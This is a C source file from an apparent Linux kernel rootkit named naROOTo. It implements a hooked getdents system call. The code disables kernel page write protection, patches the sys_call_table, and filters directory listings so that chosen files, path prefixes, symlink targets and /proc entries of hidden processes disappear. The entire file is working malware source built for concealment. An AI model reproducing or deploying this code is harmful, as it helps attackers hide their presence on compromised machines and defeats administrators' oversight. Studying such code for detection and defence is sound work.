/******************************************************************************
 *
 * Name: getdents.c 
 * This file contains everything needed for the manipulated getdents syscall.
 *
 *****************************************************************************/
/*
 * This file is part of naROOTo.

 * naROOTo is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.

 * naROOTo is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.

 * You should have received a copy of the GNU General Public License
 * along with naROOTo.  If not, see <http://www.gnu.org/licenses/>. 
 */

#include <asm/uaccess.h>
#include <linux/delay.h>
#include <linux/unistd.h>

#include "control.h"
#include "include.h"

/* pointers to some important kernel functions/resources */
asmlinkage long (*original_getdents) (unsigned int fd,
				      struct linux_dirent * dirp,
				      unsigned int count);
asmlinkage ssize_t(*syscall_readlink) (const char *path, char *buf,
				       size_t bufsiz);

/* used to keep track of whether we hooked getdents or not */
static unsigned int getdents_hooked = 0;

/*
 * call counter to ensure that we are not unhooking the
 * getdents function while it is in use and the corresponding
 * spinlock
 */
static int getdents_call_counter = 0;
static spinlock_t getdents_lock;
static unsigned long getdents_lock_flags;

/*
 * this function iterates through the path.
 * useful to check each (folder)name if it matches.
 */
char *get_next_level(char *path, int *buflen)
{
	char *ptr;
	char delimiter = '/';

	/* safety check */
	if (path == NULL)
		return NULL;

	/* get the next occurrence of '/' */
	ptr = strnchr(path, *buflen, delimiter);

	/* safety check */
	if (ptr == NULL)
		return NULL;
	else {
		/*
		 * if it is not the last character
		 * return the remainder
		 */
		if (strlen(ptr) > 1) {
			ptr += 1;
			*buflen -= (int)(ptr - path);
			if (*buflen < 0) {
				ROOTKIT_DEBUG("buflen = %i, path = '%s'",
					      *buflen, path);
				return NULL;
			}
			return ptr;
		} else
			return NULL;
	}
}

/*
 * check if we need to hide this file because it matches
 * a path to be hidden. *path is the path of the file
 * to check
 */
int check_hide_fpath(char *path)
{
	/* safety check */
	if (path == NULL)
		return 0;

	/* check with the control API if we need to hide it */
	return is_path_hidden(path);
}

/*
 * Check whether we need to hide this file because 
 * of its prefix
 */
int check_hide_fprefix(char *path, int *buflen)
{
	char *d_name;

	struct file_prefix *cur;
	struct list_head *cursor;

	/* safety check */
	if (path == NULL)
		return 0;

	d_name = path;

	do {
		/* check each hidden prefix of the control API */
		list_for_each(cursor, get_prefix_list()) {
			cur = list_entry(cursor, struct file_prefix, list);

			/* on match hide the file/folder */
			if (strstr(d_name, cur->name) == d_name)
				return 1;
		}

		/* prepare for the next iteration */
		d_name = get_next_level(d_name, buflen);
	} while (d_name != NULL);

	/* do not hide it */
	return 0;
}

/* 
 * check if we need to hide a file because it is the process
 * id of a hidden process. fd must match the /proc folder.
 */
int check_hide_process(int fd, char *d_name)
{
	int ret;
	char *dir;
	int retv = 0;

	/* allocate memory on the heap */
	dir = kmalloc(1024, GFP_KERNEL);

	/* use our function to get the path of the folder */
	ret = get_path(fd, dir, 1024);

	/* safety check */
	if (ret <= 0) {
		ROOTKIT_DEBUG
		    ("Something probably went wrong in check_hide_process(): ret <= 0\n");
		goto out;
	}

	/* safety check */
	if (dir == NULL) {
		ROOTKIT_DEBUG
		    ("Something probably went wrong in check_hide_process(): dir == NULL\n");
		goto out;
	}

	/* check if we are in the /proc directory */
	if (strncmp(dir, "/proc", 5) == 0) {
		retv = is_process_hidden(convert_atoi(d_name));
		goto out;
	}

 out:
	kfree(dir);
	return retv;
}

int check_hide_loop(char *path)
{
	mm_segment_t old_fs;
	char *lpath;
	char *curpath;
	ssize_t lpath_len;
	int retv = 0;
	int *curpath_len;

	/* allocate memory on the heap */
	lpath = (char *)kmalloc(sizeof(char) * 1024, GFP_KERNEL);
	curpath = (char *)kmalloc(sizeof(char) * 1024, GFP_KERNEL);
	curpath_len = (int *)kmalloc(sizeof(int), GFP_KERNEL);

	memset(curpath, 0, 1024);
	strncpy(curpath, path, 1024);
	*curpath_len = 1024;

	do {
		/* safety check */
		if (curpath == NULL)
			break;

		/* check if the current link is pointing to a hidden path or prefix */
		if (check_hide_fpath(curpath)
		    || check_hide_fprefix(curpath, curpath_len)) {
			retv = 1;
			break;
		}

		/* reset variables */
		memset(lpath, 0, 1024);

		/* tell the kernel to ignore kernel-space memory in syscalls */
		old_fs = get_fs();
		set_fs(KERNEL_DS);

		/* execute our readlinkat syscall */
		lpath_len = (*syscall_readlink) (curpath, lpath, 1023);

		/* zero-terminate the string */
		memset(lpath + lpath_len + 1, '\0', 1);

		/* reset the kernel */
		set_fs(old_fs);

		/* prepare for the next loop */
		strncpy(curpath, lpath, 1024);
	} while (lpath_len > 0);

	/* cleanup and return */
	kfree(curpath_len);
	kfree(curpath);
	kfree(lpath);
	return retv;
}

/*
 * Our manipulated getdents syscall. It checks whether a particular file needs to be hidden.
 * If it matches then don't show, otherwise works normally and calls the original getdents.
 */
asmlinkage long
manipulated_getdents(unsigned int fd, struct linux_dirent __user * dirp,
		     unsigned int count)
{
	/* lock and increase the call counter */
	INCREASE_CALL_COUNTER(getdents_call_counter, &getdents_lock,
			      getdents_lock_flags);

	long retv;
	int len = 0;
	int tlen = 0;
	int offset = 0;

	char *path;
	ssize_t path_len;

	/* allocate memory on the heap */
	path = (char *)kmalloc(sizeof(char) * 1024, GFP_KERNEL);

	/* call the original function for its output */
	retv = (*original_getdents) (fd, dirp, count);
	tlen = retv;

	/* get the current path and terminate it with a '/' */
	path_len = get_path(fd, path, 1024);
	if (path_len > 0 && path[path_len - 1] != '/') {
		memset(path + path_len, '/', 1);
		offset = 1;
	}

	/* loop all entries */
	while (tlen > 0) {
		len = dirp->d_reclen;
		tlen = tlen - len;

		/* append the file/folder name to the path and zero-terminate it */
		strcpy(path + path_len + offset, dirp->d_name);
		memset(path + path_len + offset + strlen(dirp->d_name), '\0',
		       1);

		/* check whether we need to hide the file */
		if (check_hide_process(fd, dirp->d_name)
		    || check_hide_loop(path)) {
			/* remove it from the output */
			memmove(dirp, (char *)dirp + dirp->d_reclen, tlen);
			retv -= len;
		} else if (tlen != 0)
			dirp =
			    (struct linux_dirent *)((char *)dirp +
						    dirp->d_reclen);
	}

	kfree(path);
	/* lock and decrease the call counter */
	DECREASE_CALL_COUNTER(getdents_call_counter, &getdents_lock,
			      getdents_lock_flags);
	return retv;
}

/*
 * hooks the system call 'getdents'
 */
void hook_getdents(void)
{
	ROOTKIT_DEBUG("Hooking the getdents syscall...\n");

	void **sys_call_table = (void *)sysmap_sys_call_table;

	/* initialize our spinlock for the getdents counter */
	spin_lock_init(&getdents_lock);

	/* get the 'readlink' syscall */
	syscall_readlink = (void *)sys_call_table[__NR_readlink];

	/* disable write protection */
	disable_page_protection();

	/* replace the syscall getdents */
	original_getdents = (void *)sys_call_table[__NR_getdents];
	sys_call_table[__NR_getdents] = (long *)manipulated_getdents;

	/* reenable write protection */
	enable_page_protection();

	/* set to hooked */
	getdents_hooked = 1;

	/* log and return */
	ROOTKIT_DEBUG("Done.\n");
	return;
}

/*
 * restores the original system call 'getdents'
 */
void unhook_getdents(void)
{
	ROOTKIT_DEBUG("Restoring the original getdents syscall...\n");

	/* only do anything if getdents is actually hooked */
	if (!getdents_hooked) {
		ROOTKIT_DEBUG("Nothing to do.\n");
		return;
	}

	void **sys_call_table = (void *)sysmap_sys_call_table;

	/* disable write protection */
	disable_page_protection();

	/* restore the old syscall */
	sys_call_table[__NR_getdents] = (long *)original_getdents;

	/* reenable write protection */
	enable_page_protection();

	/* set to not-hooked */
	getdents_hooked = 0;

	/* ensure that all processes have left our manipulated syscall */
	while (getdents_call_counter > 0) {
		msleep(2);
	}

	/* log and return */
	ROOTKIT_DEBUG("Done.\n");
}
